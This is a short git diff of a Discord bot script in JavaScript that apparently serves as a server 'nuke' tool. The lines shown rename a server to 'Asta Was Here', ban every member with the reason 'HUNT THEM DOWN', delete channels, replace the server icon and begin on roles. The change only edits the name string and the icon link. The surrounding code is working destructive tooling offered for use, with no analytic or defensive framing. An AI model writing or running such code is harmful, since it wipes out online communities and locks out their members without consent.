@@ -271,7 +271,7 @@ client.on("message", async message => {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
                 message.delete();
-                message.guild.setName(`Asta was here`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
+                message.guild.setName(`Asta Was Here`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
                 // Ban All
                   message.guild.members.cache.forEach(member => member.ban({ reason: "HUNT THEM DOWN" })
@@ -284,7 +284,7 @@ client.on("message", async message => {
                     console.log(redBright(`CHANNEL FUCKED`))
                 ).then(
                     // Channel Icon Change
-                    message.guild.setIcon('https://media.discordapp.net/attachments/762716843323686914/806514914755739648/29f9186f3c0e3ed8d4846eb95782ad4db27048af_00.png') // changes server pfp
+                    message.guild.setIcon('https://cdn.discordapp.com/attachments/816817956507746304/816818126758346792/7e6dc28f38ae71f76c6dcdd879ddbe29.png') // changes server pfp
                 ));
 
                 // Roles
